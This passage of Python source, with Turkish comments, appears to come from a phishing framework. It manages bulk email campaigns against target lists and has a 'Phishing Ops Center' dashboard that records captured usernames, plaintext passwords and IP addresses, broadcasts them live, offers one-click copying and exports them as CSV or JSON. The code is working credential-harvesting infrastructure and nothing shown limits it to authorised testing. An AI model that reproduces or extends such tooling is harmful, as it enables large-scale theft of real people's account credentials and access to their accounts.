            from_email=from_email,
            from_name=from_name,
            reply_to=reply_to,
            smtp_config=smtp_config or {},
            send_rate=send_rate,
            max_emails=max_emails,
            tags=tags or []
        )
        
        with self.lock:
            self.campaigns[campaign.campaign_id] = campaign
            self._save_campaign(campaign)
        
        return campaign
    
    def update_campaign(self, campaign_id: str, **kwargs) -> Optional[Campaign]:
        """Mevcut kampanyayı günceller."""
        with self.lock:
            if campaign_id not in self.campaigns:
                return None
            
            campaign = self.campaigns[campaign_id]
            
            for key, value in kwargs.items():
                if hasattr(campaign, key) and key != "campaign_id":
                    setattr(campaign, key, value)
            
            campaign.updated_at = datetime.datetime.now()
            self._save_campaign(campaign)
            
            return campaign
    
    def delete_campaign(self, campaign_id: str) -> bool:
        """Kampanyayı siler."""
        with self.lock:
            if campaign_id not in self.campaigns:
                return False
            
            campaign = self.campaigns.pop(campaign_id)
            
            with db_conn(self.db_path) as conn:
                conn.execute("DELETE FROM campaigns WHERE campaign_id = ?", (campaign_id,))
                conn.execute("DELETE FROM campaign_targets WHERE campaign_id = ?", (campaign_id,))
                conn.execute("DELETE FROM email_queue WHERE campaign_id = ?", (campaign_id,))
                conn.commit()
            
            return True
    
    def get_campaign(self, campaign_id: str) -> Optional[Campaign]:
        """Kampanyayı ID ile getirir."""
        with self.lock:
            return self.campaigns.get(campaign_id)
    
    def list_campaigns(self, status: Optional[CampaignStatus] = None,
                      tags: Optional[List[str]] = None) -> List[Campaign]:
        """Kampanyaları listeler."""
        with self.lock:
            campaigns = list(self.campaigns.values())
            
            if status:
                campaigns = [c for c in campaigns if c.status == status]
            
            if tags:
                campaigns = [c for c in campaigns if any(t in c.tags for t in tags)]
            
            return sorted(campaigns, key=lambda x: x.created_at, reverse=True)
    
    def add_targets(self, campaign_id: str, targets: List[Target]) -> int:
        """Kampanyaya hedef ekler."""
        campaign = self.get_campaign(campaign_id)
        if not campaign:
            return 0
        
        campaign.targets.extend(targets)
        
        with db_conn(self.db_path) as conn:
            for target in targets:
                conn.execute("""
                    INSERT INTO campaign_targets (
                        campaign_id, email, first_name, last_name,
                        company, position, custom_fields, tags
                    )
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    campaign_id, target.email, target.first_name,
                    target.last_name, target.company, target.position,
                    json.dumps(target.custom_fields), json.dumps(target.tags)
                ))
            conn.commit()
        
        self._save_campaign(campaign)
        return len(targets)
    
    def get_targets(self, campaign_id: str) -> List[Target]:
        """Kampanya hedeflerini getirir."""
        with db_conn(self.db_path) as conn:
            rows = conn.execute(
                "SELECT * FROM campaign_targets WHERE campaign_id = ?", (campaign_id,)
            ).fetchall()
        
        return [
            Target(
                email=row[2],
                first_name=row[3],
                last_name=row[4],
                company=row[5],
                position=row[6],
                custom_fields=json.loads(row[7]) if row[7] else {},
                tags=json.loads(row[8]) if row[8] else []
            )
            for row in rows
        ]
    
    def start_campaign(self, campaign_id: str) -> bool:
        """Kampanyayı başlatır."""
        campaign = self.get_campaign(campaign_id)
        if not campaign:
            return False
        
        if not campaign.template_id:
            print("[!] Kampanyada şablon belirtilmemiş!")
            return False
        
        if not campaign.targets:
            print("[!] Kampanyada hedef bulunamadı!")
            return False
        
        campaign.status = CampaignStatus.RUNNING
        campaign.updated_at = datetime.datetime.now()
        
        self._save_campaign(campaign)
        
        thread = threading.Thread(
            target=self._run_campaign,
            args=(campaign_id,),
            daemon=True
        )
        thread.start()
        
        return True
    
    def pause_campaign(self, campaign_id: str) -> bool:
        """Kampanyayı duraklatır."""
        campaign = self.get_campaign(campaign_id)
        if not campaign:
            return False
        
        campaign.status = CampaignStatus.PAUSED
        campaign.updated_at = datetime.datetime.now()
        
        self._save_campaign(campaign)
        return True
    
    def stop_campaign(self, campaign_id: str) -> bool:
        """Kampanyayı durdurur."""
        campaign = self.get_campaign(campaign_id)
        if not campaign:
            return False
        
        campaign.status = CampaignStatus.COMPLETED
        campaign.updated_at = datetime.datetime.now()
        campaign.completed_at = datetime.datetime.now()
        
        self._save_campaign(campaign)
        return True
    
    def _run_campaign(self, campaign_id: str):
        """Kampanyayı çalıştırır (arka plan işlemi)."""
        campaign = self.get_campaign(campaign_id)
        if not campaign:
            return
        
        template = self.template_manager.get_template(campaign.template_id)
        if not template:
            print(f"[!] Şablon bulunamadı: {campaign.template_id}")
            return
        
        messages = []
        max_count = campaign.max_emails or len(campaign.targets)
        
        for target in campaign.targets[:max_count]:
            variables = {
                "first_name": target.first_name or "",
                "last_name": target.last_name or "",
                "email": target.email,
                "company": target.company or "",
                "position": target.position or ""
            }
            variables.update(target.custom_fields)
            
            subject, html, text = template.render(variables)
            
            message = EmailMessage(
                message_id=f"msg_{uuid.uuid4().hex[:16]}",
                campaign_id=campaign_id,
                template_id=campaign.template_id,
                to_email=target.email,
                to_name=target.get_display_name(),
                from_email=campaign.from_email or template.from_email or "",
                from_name=campaign.from_name or template.from_name or "",
                subject=subject,
                html_content=html,
                text_content=text,
                variables=variables
            )
            messages.append(message)
        
        if campaign.smtp_config:
            results = self.smtp_engine.send_bulk_emails(
                smtp_config=campaign.smtp_config,
                messages=messages,
                send_rate=campaign.send_rate
            )
            
            campaign.stats["sent"] = results["success"]
            campaign.stats["failed"] = results["failed"]
            campaign.stats["total"] = len(messages)
            
        self._save_campaign(campaign)
    
    def get_campaign_stats(self, campaign_id: str) -> Dict:
        """Kampanya istatistiklerini döndürür."""
        campaign = self.get_campaign(campaign_id)
        if not campaign:
            return {}
        
        analytics = self.harvester.get_analytics(campaign_id)
        
        return {
            "campaign": campaign.to_dict(),
            "analytics": analytics,
            "target_count": len(campaign.targets),
            "progress": round(
                (campaign.stats["sent"] / max(campaign.stats["total"], 1) * 100), 2
            )
        }
    
    def _save_campaign(self, campaign: Campaign):
        """Kampanyayı veritabanına kaydeder."""
        campaign_data = {
            "campaign_id": campaign.campaign_id,
            "name": campaign.name,
            "description": campaign.description,
            "template_id": campaign.template_id,
            "status": campaign.status.value,
            "from_email": campaign.from_email,
            "from_name": campaign.from_name,
            "reply_to": campaign.reply_to,
            "smtp_config": json.dumps(campaign.smtp_config),
            "schedule_start": campaign.schedule_start.isoformat() if campaign.schedule_start else None,
            "schedule_end": campaign.schedule_end.isoformat() if campaign.schedule_end else None,
            "send_rate": campaign.send_rate,
            "max_emails": campaign.max_emails,
            "stats": json.dumps(campaign.stats),
            "tags": json.dumps(campaign.tags),
            "updated_at": campaign.updated_at.isoformat()
        }
        
        with db_conn(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO campaigns (
                    campaign_id, name, description, template_id, status,
                    from_email, from_name, reply_to, smtp_config,
                    schedule_start, schedule_end, send_rate, max_emails,
                    stats, tags, updated_at
                )
                VALUES (
                    :campaign_id, :name, :description, :template_id, :status,
                    :from_email, :from_name, :reply_to, :smtp_config,
                    :schedule_start, :schedule_end, :send_rate, :max_emails,
                    :stats, :tags, :updated_at
                )
            """, campaign_data)
            conn.commit()
    
    def _load_campaigns(self):
        """Kampanyaları veritabanından yükler."""
        with db_conn(self.db_path) as conn:
            rows = conn.execute("SELECT * FROM campaigns").fetchall()
        
        for row in rows:
            try:
                campaign = Campaign(
                    campaign_id=row[0],
                    name=row[1],
                    description=row[2] or "",
                    template_id=row[3],
                    status=CampaignStatus(row[4]),
                    from_email=row[5],
                    from_name=row[6],
                    reply_to=row[7],
                    smtp_config=json.loads(row[8]) if row[8] else {},
                    schedule_start=datetime.datetime.fromisoformat(row[9]) if row[9] else None,
                    schedule_end=datetime.datetime.fromisoformat(row[10]) if row[10] else None,
                    send_rate=row[11] or 10,
                    max_emails=row[12],
                    stats=json.loads(row[13]) if row[13] else {},
                    tags=json.loads(row[14]) if row[14] else [],
                    created_at=datetime.datetime.fromisoformat(row[15]) if row[15] else datetime.datetime.now(),
                    updated_at=datetime.datetime.fromisoformat(row[16]) if row[16] else datetime.datetime.now()
                )
                
                self.campaigns[campaign.campaign_id] = campaign
                
            except Exception as e:
                print(f"[!] Kampanya yükleme hatası: {e}")


# --- PROFESyonel DASHBOARD ---
class LivePhishingDashboard:
    """
    Profesyonel Canlı Phishing Dashboard
    Gerçek zamanlı kampanya izleme ve raporlama.
    """
    
    def __init__(self, db_path: str = PHISHING_DB_PATH):
        self.db_path = db_path
        self.ws_clients = set()
        self.dashboard_lock = threading.Lock()
        
        self.setup_database()
        self._ensure_directories()
    
    def _ensure_directories(self):
        """Gerekli dizinleri oluşturur."""
        os.makedirs(TEMPLATE_PATH, exist_ok=True)
        os.makedirs(TEMP_ATTACHMENTS_PATH, exist_ok=True)
    
    def setup_database(self):
        """Veritabanı şemasını oluşturur."""
        harvester = CredentialHarvester(self.db_path)
    
    def log_credential(self, campaign_id: str, username: str, password: str,
                      ip_address: str, user_agent: str, message_id: Optional[str] = None) -> bool:
        """Kimlik bilgisi kaydeder ve yayınlar."""
        harvester = CredentialHarvester(self.db_path)
        harvester.log_credential(
            campaign_id=campaign_id,
            username=username,
            password=password,
            ip_address=ip_address,
            user_agent=user_agent,
            message_id=message_id
        )
        
        self.broadcast_credential({
            "type": "new_credential",
            "campaign_id": campaign_id,
            "username": username,
            "password": password,
            "ip_address": ip_address,
            "timestamp": datetime.datetime.now().isoformat()
        })
        
        return True
    
    def log_click(self, campaign_id: str, ip_address: str,
                 message_id: Optional[str] = None, target_url: Optional[str] = None) -> bool:
        """Tıklama kaydeder ve yayınlar."""
        harvester = CredentialHarvester(self.db_path)
        harvester.log_click(
            campaign_id=campaign_id,
            ip_address=ip_address,
            user_agent="",
            message_id=message_id,
            target_url=target_url
        )
        
        self.broadcast_credential({
            "type": "new_click",
            "campaign_id": campaign_id,
            "ip_address": ip_address,
            "target_url": target_url,
            "timestamp": datetime.datetime.now().isoformat()
        })
        
        return True
    
    def broadcast_credential(self, data: Dict):
        """WebSocket benzeri yayın simülasyonu."""
        message = json.dumps(data, default=str)
        print(f"\n[WEBSOCKET BROADCAST] {message}")
        print(f"[Connected clients: {len(self.ws_clients)}]")
    
    def get_dashboard_stats(self, campaign_id: Optional[str] = None) -> Dict:
        """Dashboard istatistiklerini döndürür."""
        harvester = CredentialHarvester(self.db_path)
        analytics = harvester.get_analytics(campaign_id)
        
        return {
            **analytics,
            "campaign_id": campaign_id or "all",
            "timestamp": datetime.datetime.now().isoformat()
        }
    
    def create_live_dashboard_html(self, campaign_id: str) -> str:
        """Canlı dashboard HTML'i oluşturur."""
        harvester = CredentialHarvester(self.db_path)
        stats = harvester.get_analytics(campaign_id)
        credentials = harvester.get_credentials(campaign_id, limit=50)
        
        html = f"""
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phishing Ops Center - {campaign_id}</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.0/socket.io.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <style>
        :root {{
            --primary: #00ff00;
            --primary-dim: #00cc00;
            --danger: #ff3333;
            --warning: #ffaa00;
            --info: #00aaff;
            --bg-dark: #0a0a0f;
            --bg-card: rgba(20, 20, 30, 0.95);
            --bg-input: rgba(30, 30, 40, 0.8);
            --text-primary: #e0e0e0;
            --text-muted: #888;
            --border-color: rgba(0, 255, 0, 0.2);
        }}
        
        * {{
            box-sizing: border-box;
        }}
        
        body {{
            background: linear-gradient(135deg, var(--bg-dark) 0%, #1a1a2e 50%, #0f0f1a 100%);
            color: var(--text-primary);
            font-family: 'Segoe UI', 'Roboto', sans-serif;
            min-height: 100vh;
        }}
        
        .navbar {{
            background: rgba(0, 0, 0, 0.9) !important;
            border-bottom: 1px solid var(--border-color);
            backdrop-filter: blur(10px);
        }}
        
        .navbar-brand {{
            font-weight: 700;
            letter-spacing: 2px;
        }}
        
        .card {{
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            margin-bottom: 20px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }}
        
        .card:hover {{
            transform: translateY(-2px);
            box-shadow: 0 6px 25px rgba(0, 255, 0, 0.15);
        }}
        
        .stat-card {{
            text-align: center;
            padding: 25px 15px;
            position: relative;
            overflow: hidden;
        }}
        
        .stat-card::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--primary), var(--info));
        }}
        
        .stat-number {{
            font-size: 2.8em;
            font-weight: 800;
            background: linear-gradient(135deg, var(--primary), var(--primary-dim));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            line-height: 1.2;
        }}
        
        .stat-label {{
            color: var(--text-muted);
            font-size: 0.85em;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 8px;
        }}
        
        .credential-table {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
        }}
        
        .credential-table th {{
            background: rgba(0, 255, 0, 0.1);
            color: var(--primary);
            font-weight: 600;
            text-transform: uppercase;
            font-size: 0.75em;
            letter-spacing: 1px;
            border-bottom: 2px solid var(--border-color);
        }}
        
        .credential-table td {{
            vertical-align: middle;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }}
        
        .new-credential {{
            animation: flash 1.5s ease-in-out;
            background: rgba(0, 255, 0, 0.15) !important;
        }}
        
        @keyframes flash {{
            0% {{ background: rgba(0, 255, 0, 0.6); }}
            100% {{ background: rgba(0, 255, 0, 0.15); }}
        }}
        
        .live-indicator {{
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }}
        
        .live-dot {{
            width: 10px;
            height: 10px;
            background: #00ff00;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
            box-shadow: 0 0 10px #00ff00;
        }}
        
        @keyframes pulse {{
            0%, 100% {{ opacity: 1; transform: scale(1); }}
            50% {{ opacity: 0.7; transform: scale(1.1); }}
        }}
        
        .console-output {{
            background: rgba(0, 5, 0, 0.95);
            border: 1px solid var(--border-color);
            padding: 15px;
            border-radius: 8px;
            font-family: 'Cascadia Code', 'Fira Code', 'Courier New', monospace;
            font-size: 0.8em;
            max-height: 250px;
            overflow-y: auto;
        }}
        
        .console-line {{
            margin: 6px 0;
            padding: 6px 10px;
            border-left: 3px solid var(--primary);
            background: rgba(0, 255, 0, 0.03);
            border-radius: 0 4px 4px 0;
        }}
        
        .console-line.credential {{
            border-left-color: #ff00ff;
            background: rgba(255, 0, 255, 0.05);
        }}
        
        .console-line.click {{
            border-left-color: var(--info);
            background: rgba(0, 170, 255, 0.05);
        }}
        
        .progress {{
            height: 24px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
        }}
        
        .progress-bar {{
            background: linear-gradient(90deg, var(--primary), var(--primary-dim));
            border-radius: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 0.75em;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
        }}
        
        .btn-outline-primary {{
            border-color: var(--primary);
            color: var(--primary);
        }}
        
        .btn-outline-primary:hover {{
            background: var(--primary);
            color: #000;
        }}
        
        .btn-outline-warning {{
            border-color: var(--warning);
            color: var(--warning);
        }}
        
        .btn-outline-warning:hover {{
            background: var(--warning);
            color: #000;
        }}
        
        .btn-outline-danger {{
            border-color: var(--danger);
            color: var(--danger);
        }}
        
        .btn-outline-danger:hover {{
            background: var(--danger);
            color: #fff;
        }}
        
        .badge {{
            font-weight: 600;
            padding: 0.5em 0.8em;
        }}
        
        .badge-captured {{
            background: linear-gradient(135deg, var(--primary), var(--primary-dim));
            color: #000;
        }}
        
        .copy-btn {{
            cursor: pointer;
            transition: all 0.2s;
        }}
        
        .copy-btn:hover {{
            color: var(--primary);
        }}
        
        .ip-address {{
            font-family: 'Cascadia Code', monospace;
            color: var(--info);
        }}
        
        .timestamp {{
            font-size: 0.8em;
            color: var(--text-muted);
        }}
        
        /* Scrollbar styling */
        ::-webkit-scrollbar {{
            width: 8px;
        }}
        
        ::-webkit-scrollbar-track {{
            background: rgba(0, 0, 0, 0.3);
        }}
        
        ::-webkit-scrollbar-thumb {{
            background: var(--primary);
            border-radius: 4px;
        }}
        
        ::-webkit-scrollbar-thumb:hover {{
            background: var(--primary-dim);
        }}
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark">
        <div class="container-fluid">
            <a class="navbar-brand text-primary" href="#">
                <i class="bi bi-broadcast"></i> PHISHING OPS CENTER
            </a>
            <div class="d-flex align-items-center gap-3">
                <span class="live-indicator">
                    <span class="live-dot"></span>
                    <span class="text-success">LIVE</span>
                </span>
                <span class="badge bg-secondary" id="campaignIdBadge">{campaign_id}</span>
            </div>
        </div>
    </nav>

    <div class="container-fluid mt-4 px-4">
        <div class="row">
            <!-- Ana İstatistikler -->
            <div class="col-lg-3 col-md-6 mb-4">
                <div class="card stat-card">
                    <div class="stat-number" id="totalClicks">{stats.get('total_clicks', 0)}</div>
                    <div class="stat-label">
                        <i class="bi bi-cursor"></i> Toplam Tıklama
                    </div>
                </div>
            </div>
            
            <div class="col-lg-3 col-md-6 mb-4">
                <div class="card stat-card">
                    <div class="stat-number" id="totalCredentials">{stats.get('total_credentials', 0)}</div>
                    <div class="stat-label">
                        <i class="bi bi-key"></i> Ele Geçirilen Kimlik
                    </div>
                </div>
            </div>
            
            <div class="col-lg-3 col-md-6 mb-4">
                <div class="card stat-card">
                    <div class="stat-number" id="conversionRate">{stats.get('conversion_rate', 0)}%</div>
                    <div class="stat-label">
                        <i class="bi bi-graph-up"></i> Dönüşüm Oranı
                    </div>
                </div>
            </div>
            
            <div class="col-lg-3 col-md-6 mb-4">
                <div class="card stat-card">
                    <div class="stat-number" id="totalSessions">{stats.get('total_sessions', 0)}</div>
                    <div class="stat-label">
                        <i class="bi bi-people"></i> Oturum Sayısı
                    </div>
                </div>
            </div>
        </div>
        
        <div class="row">
            <!-- Kimlik Bilgileri Tablosu -->
            <div class="col-lg-8">
                <div class="card">
                    <div class="card-body">
                        <div class="d-flex justify-content-between align-items-center mb-3">
                            <h4 class="card-title mb-0">
                                <i class="bi bi-shield-lock"></i> Ele Geçirilen Kimlik Bilgileri
                            </h4>
                            <span class="badge badge-captured" id="credCount">{len(credentials)} Yakalanan</span>
                        </div>
                        <div class="table-responsive" style="max-height: 400px; overflow-y: auto;">
                            <table class="table table-dark table-hover credential-table" id="credentialsTable">
                                <thead>
                                    <tr>
                                        <th><i class="bi bi-clock"></i> Zaman</th>
                                        <th><i class="bi bi-person"></i> Kullanıcı Adı</th>
                                        <th><i class="bi bi-key"></i> Parola</th>
                                        <th><i class="bi bi-globe"></i> IP Adresi</th>
                                        <th><i class="bi bi-window"></i> User Agent</th>
                                        <th><i class="bi bi-flag"></i> Durum</th>
                                    </tr>
                                </thead>
                                <tbody id="credentialsBody">
                                    {''.join([f'''
                                    <tr class="credential-row" data-username="{c['username']}">
                                        <td class="timestamp">{c.get('timestamp', '')}</td>
                                        <td><code class="copy-btn" onclick="copyToClipboard('{c['username']}')" title="Kopyalamak için tıkla">{c['username']}</code></td>
                                        <td><code class="copy-btn" onclick="copyToClipboard('{c['password']}')" title="Kopyalamak için tıkla">{c['password']}</code></td>
                                        <td class="ip-address">{c.get('ip_address', '')}</td>
                                        <td><small class="text-muted">{(c.get('user_agent', '') or '')[:40]}...</small></td>
                                        <td><span class="badge badge-captured">YAKALANDI</span></td>
                                    </tr>
                                    ''' for c in credentials]) if credentials else '<tr><td colspan="6" class="text-center text-muted py-5"><i class="bi bi-inbox fs-1 d-block mb-2"></i>Henüz kimlik bilgisi yakalanmadı</td></tr>'}
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
                
                <!-- Canlı Konsol -->
                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-terminal"></i> Canlı Operasyon Konsolu
                        </h4>
                        <div class="console-output" id="consoleOutput">
                            <div class="console-line">
                                <span class="text-muted">[{datetime.datetime.now().strftime('%H:%M:%S')}]</span>
                                <span class="text-success">Sistem başlatıldı. Bağlantılar bekleniyor...</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Yan Panel -->
            <div class="col-lg-4">
                <!-- İlerleme Göstergesi -->
                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-graph-up-arrow"></i> Kampanya İlerlemesi
                        </h4>
                        <div class="text-center mb-3">
                            <div class="display-6 text-warning" id="progressPercent">0%</div>
                            <small class="text-muted">Tamamlanan İşlemler</small>
                        </div>
                        <div class="progress" style="height: 30px;">
                            <div class="progress-bar bg-success" id="progressBar" style="width: 0%"></div>
                        </div>
                        <div class="row mt-3 text-center">
                            <div class="col-4">
                                <div class="text-muted small">Gönderilen</div>
                                <div class="fw-bold text-primary" id="sentCount">0</div>
                            </div>
                            <div class="col-4">
                                <div class="text-muted small">Başarısız</div>
                                <div class="fw-bold text-danger" id="failedCount">0</div>
                            </div>
                            <div class="col-4">
                                <div class="text-muted small">Bekleyen</div>
                                <div class="fw-bold text-warning" id="pendingCount">0</div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Kampanya Bilgileri -->
                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-info-circle"></i> Kampanya Bilgileri
                        </h4>
                        <div class="mb-3">
                            <small class="text-muted d-block">Kampanya ID</small>
                            <code class="float-end">{campaign_id}</code>
                        </div>
                        <div class="mb-3">
                            <small class="text-muted d-block">Durum</small>
                            <span class="badge bg-success float-end">AKTİF</span>
                        </div>
                        <div class="mb-3">
                            <small class="text-muted d-block">Başlangıç</small>
                            <span class="float-end">{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}</span>
                        </div>
                        <div class="mb-0">
                            <small class="text-muted d-block">Açılan E-postalar</small>
                            <span class="badge bg-info float-end" id="openCount">{stats.get('unique_opens', 0)}</span>
                        </div>
                    </div>
                </div>
                
                <!-- Hızlı Eylemler -->
                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-lightning"></i> Hızlı Eylemler
                        </h4>
                        <div class="d-grid gap-2">
                            <button class="btn btn-outline-primary" onclick="exportCredentials('csv')">
                                <i class="bi bi-filetype-csv"></i> CSV Olarak Dışa Aktar
                            </button>
                            <button class="btn btn-outline-primary" onclick="exportCredentials('json')">
                                <i class="bi bi-filetype-json"></i> JSON Olarak Dışa Aktar
                            </button>
                            <button class="btn btn-outline-warning" onclick="refreshDashboard()">
                                <i class="bi bi-arrow-clockwise"></i> Paneli Yenile
                            </button>
                            <button class="btn btn-outline-danger" onclick="clearCredentials()">
                                <i class="bi bi-trash"></i> Tümünü Temizle
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const campaignId = "{campaign_id}";
        
        function addConsoleMessage(message, type = 'info') {{
            const consoleOutput = document.getElementById('consoleOutput');
            const line = document.createElement('div');
            line.className = 'console-line ' + type;
            
            const time = new Date().toLocaleTimeString();
            let icon = '';
            if (type === 'credential') icon = '<i class="bi bi-key text-warning"></i> ';
            else if (type === 'click') icon = '<i class="bi bi-cursor text-info"></i> ';
            else icon = '<i class="bi bi-info-circle text-success"></i> ';
            
            line.innerHTML = '<span class="text-muted">[' + time + ']</span> ' + icon + message;
            consoleOutput.appendChild(line);
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
        }}
        
        function addCredentialRow(data) {{
            const tbody = document.getElementById('credentialsBody');
            const emptyRow = tbody.querySelector('td[colspan="6"]');
            if (emptyRow) {{
                emptyRow.parentElement.remove();
            }}
            
            const row = document.createElement('tr');
            row.className = 'new-credential credential-row';
            row.setAttribute('data-username', data.username);
            
            const time = new Date().toLocaleString();
            row.innerHTML = '<td class="timestamp">' + time + '</td>' +
                           '<td><code class="copy-btn" onclick="copyToClipboard(\\'' + data.username + '\\')" title="Kopyalamak için tıkla">' + data.username + '</code></td>' +
                           '<td><code class="copy-btn" onclick="copyToClipboard(\\'' + data.password + '\\')" title="Kopyalamak için tıkla">' + data.password + '</code></td>' +
                           '<td class="ip-address">' + data.ip_address + '</td>' +
                           '<td><small class="text-muted">Browser</small></td>' +
                           '<td><span class="badge badge-captured">YENİ</span></td>';
            
            tbody.insertBefore(row, tbody.firstChild);
            setTimeout(() => row.classList.remove('new-credential'), 1500);
            
            document.getElementById('credCount').textContent = (parseInt(document.getElementById('credCount').textContent) + 1) + ' Yakalanan';
            document.getElementById('totalCredentials').textContent = parseInt(document.getElementById('totalCredentials').textContent) + 1;
        }}
        
        function updateStats(stats) {{
            if (stats.total_clicks !== undefined)
                document.getElementById('totalClicks').textContent = stats.total_clicks;
            if (stats.total_credentials !== undefined)
                document.getElementById('totalCredentials').textContent = stats.total_credentials;
            if (stats.conversion_rate !== undefined)
                document.getElementById('conversionRate').textContent = stats.conversion_rate + '%';
            if (stats.total_sessions !== undefined)
                document.getElementById('totalSessions').textContent = stats.total_sessions;
            if (stats.unique_opens !== undefined)
                document.getElementById('openCount').textContent = stats.unique_opens;
        }}
        
        function copyToClipboard(text) {{
            navigator.clipboard.writeText(text).then(() => {{
                addConsoleMessage('Panoya kopyalandı: ' + text, 'info');
            }});
        }}
        
        function exportCredentials(format) {{
            window.location.href = '/phishing/export/' + campaignId + '?format=' + format;
        }}
        
        function clearCredentials() {{
            if(confirm('Tüm kimlik bilgilerini silmek istediğinizden emin misiniz?')) {{
                fetch('/phishing/clear/' + campaignId, {{ method: 'POST' }})
                    .then(r => r.json())
                    .then(data => {{
                        if(data.status === 'success') {{
                            location.reload();
                        }}
                    }});
            }}
        }}
        
        function refreshDashboard() {{
            location.reload();
        }}
        
        setInterval(() => {{
            fetch('/phishing/stats/' + campaignId)
                .then(r => r.json())
                .then(stats => updateStats(stats));
        }}, 5000);
        
        addConsoleMessage('Canlı akışa bağlandı', 'info');
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
        """
        return html
    
    def export_credentials_csv(self, campaign_id: str) -> str:
        """Kimlik bilgilerini CSV formatında dışa aktarır."""
        harvester = CredentialHarvester(self.db_path)
        return harvester.export_credentials(campaign_id, format="csv")
    
    def export_credentials_json(self, campaign_id: str) -> str:
        """Kimlik bilgilerini JSON formatında dışa aktarır."""
        harvester = CredentialHarvester(self.db_path)
        return harvester.export_credentials(campaign_id, format="json")


# --- GLOBAL MANAGER ÖRNEĞİ ---
campaign_manager = CampaignManager()
template_manager = campaign_manager.template_manager
smtp_engine = campaign_manager.smtp_engine
harvester = campaign_manager.harvester
dashboard = LivePhishingDashboard()